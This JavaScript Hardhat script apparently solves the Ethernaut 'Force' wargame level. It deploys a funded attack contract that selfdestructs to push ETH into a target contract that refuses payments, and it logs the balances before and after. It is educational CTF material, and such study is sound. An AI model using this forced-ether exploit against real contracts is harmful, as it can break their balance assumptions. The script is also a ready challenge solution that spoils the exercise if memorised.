/*
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
*/

const hre = require("hardhat");

async function main() {
  // Deployed on Ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const ForceAddress = "0x3Ec87635f37C4AB34E1D11bf6132C2C36965001e"
  this.force = await hre.ethers.getContractAt("Force",ForceAddress);

  // Deploying the Attacker contract and funding it with 0.01 ETH

  const Attack = await hre.ethers.getContractFactory("Attack");
  this.attack = await Attack.connect(player).deploy(this.force.address, { value: hre.ethers.utils.parseEther("0.01") });  // Deploy the Attack contract and filling it up with 0.01 ETH
  await this.attack.deployed();

  console.log("\n\n Performing attack ... \n\n");

  console.log(
    `
    Force contract ETH Balance before the attack ${await hre.ethers.provider.getBalance(this.force.address)} \n
    `
  );
  
  // Injecting ETH in the Force contract
  console.log("Injecting ETH in the Force contract ...");
  // The Attack contract will be selfdestructed and will send its ETH balance to the Force contract
  const tx = await this.attack.connect(player).attack();
  
  // Await for the tx to be mined
  console.log("Waiting while the ETH balance of the Force contract is manipulated : )");
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Force contract ETH Balance after the attack ${await hre.ethers.provider.getBalance(this.force.address)} \n
    `
  );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});